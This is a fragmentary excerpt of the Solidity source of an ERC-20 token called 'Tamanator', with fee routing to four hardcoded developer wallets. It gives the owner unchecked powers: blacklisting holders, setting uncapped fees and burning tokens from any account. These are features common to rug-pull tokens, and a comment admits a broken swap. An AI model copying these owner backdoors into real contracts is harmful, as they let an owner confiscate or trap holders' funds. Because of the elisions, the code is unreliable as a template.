...
pragma solidity 0.8.11;
    ...
    */
    ...
    contract Tamanator is Context, IERC20, Ownable {
    ...
    address private _developerAddress1;
    address private _developerAddress2;
    address private _developerAddress3;
    address private _developerAddress4;
    ...
    string private _name = "Tamanator";
    ...
    uint256 public _maxWallet = 20000000000 * 10**9; //2% of TS
    uint256 public _maxBuy = 20000000000 * 10**9; //2% of TS
    uint256 public _maxSell = 20000000000 * 10**9; //2% if TS
    ...
    constructor () {
        ...
        _marketingAddress = payable(0x33bC9daC53336bA2408756d858888E71216438e1);
        _developerAddress1 = payable(0xF7F2c1668e9e2818A571c8E09D1aC7A12EA64067);
        _developerAddress2 = payable(0x178988EaAD5a415283cb0ce6869Bb8946E6847A4);
        _developerAddress3 = payable(0x8d9b518C9B59480fe5a875BbefEF9C3115699a91);
        _developerAddress4 = payable(0x62108b8a8B46c0Aa081b2223F6CD1d29dE8EDbfB);
        ...
        _isExcludedFromMaxTx[address(_burnAddress)] = true;
    ...
    function addToBlacklist(address account, bool isBlacklisted) public onlyOwner {
        require(_isBlacklisted[account] != isBlacklisted, "Tamanator: Account is already the value of 'blacklisted'");
        _isBlacklisted[account] = isBlacklisted;

        emit blacklist(account, isBlacklisted);
    }

    function setMaxTransaction(uint256 maxBuy, uint256 maxSell) public onlyOwner() {
        _maxBuy = maxBuy * 10 ** 9;
        _maxSell = maxSell * 10**9;
    }
    ...
    function setFees(uint256 TaxFee, uint256 DevFee, uint256 MarketingFee, uint256 BurnFee) public onlyOwner {
        _taxFee = TaxFee;
        _developerFee = DevFee;
    ...
    function checkContractBalance() external {
        ...
        address payable _contract = payable(_msgSender());
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        ...
        uint256 tBurn = calculateLiquidityPlusFees(tAmount);
    ...
    function calculateLiquidityPlusFees(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFee + _developerFee + _marketingFee).div(
            10**2
        );
    }
    
    function removeAllFee() private {
        if(_taxFee == 0 && _burnFee == 0 && _marketingFee == 0 && _developerFee == 0) return;
    ...
    function _transfer(
        ...
        if (!_isExcludedFromMaxTx[from] && !_isExcludedFromMaxTx[to] && !_isExcludedFromMaxWallet[from] && !_isExcludedFromMaxWallet[to] && from == uniswapV2Pair) {
            require(trading == true, "Trading is not enabled");
            require(amount <= _maxBuy, "Transfer amount exceeds the maxBuy.");

            uint256 contractBalanceRecepient = balanceOf(to);
            require(contractBalanceRecepient + amount <= _maxWallet, "Exceeds maximum wallet token amount.");
        }

        if (!_isExcludedFromMaxTx[from] && !_isExcludedFromMaxTx[to] && !_isExcludedFromMaxWallet[from] && !_isExcludedFromMaxWallet[to] && to == uniswapV2Pair) {
            require(trading == true, "Trading is not enabled");

            require(amount <= _maxSell, "Sell transfer amount exceeds the maxSell.");
        }
        ...
        if(contractTokenBalance >= _maxSell)
        {
            contractTokenBalance = _maxSell;
        }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        uint256 burnPortion = contractTokenBalance.mul(_burnFee).div(100);
        uint256 totalLiqFee = _marketingFee + _developerFee;
        contractTokenBalance = contractTokenBalance.sub(burnPortion);
        ...
        // swap tokens for ETH
        swapTokensForEth(contractTokenBalance); // <- this breaks the ETH -> TART swap when swap+liquify is triggered
        ...
        uint256 developerSplit = developerBalance.div(4);
        developerBalance = developerBalance.sub(developerSplit).sub(developerSplit).sub(developerSplit);
        // Marketing Portion
        uint256 marketingBalance = newBalance.div(totalLiqFee).mul(_marketingFee);
        
        (bool sent, bytes memory data) = _developerAddress1.call{value: developerSplit}("");
        (sent, data) = _developerAddress2.call{value: developerSplit}("");
        (sent, data) = _developerAddress3.call{value: developerSplit}("");
        (sent, data) = _developerAddress4.call{value: developerBalance}("");
        (sent, data) = _marketingAddress.call{value: marketingBalance}("");
        (sent, data) = _burnAddress.call{value: burnPortion}("");
  ...
  */
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "Tamanator: cannot burn from zero address");
    require(_balances[account] >= amount, "Tamanator: Cannot burn more than the account owns");
  ...
  *
  ...
  function burn(address account, uint256 amount) public onlyOwner returns(bool) {
    ...
    function addLP() external onlyOwner() {
        ...
        setMaxWallet(totalSupply());
        setMaxTransaction(totalSupply(), totalSupply());
    }

    function letsGoLive() external onlyOwner() {
        setFees(3,3,3,0);

        setMaxWallet(20000000001);
        setMaxTransaction(20000000001, 20000000001);
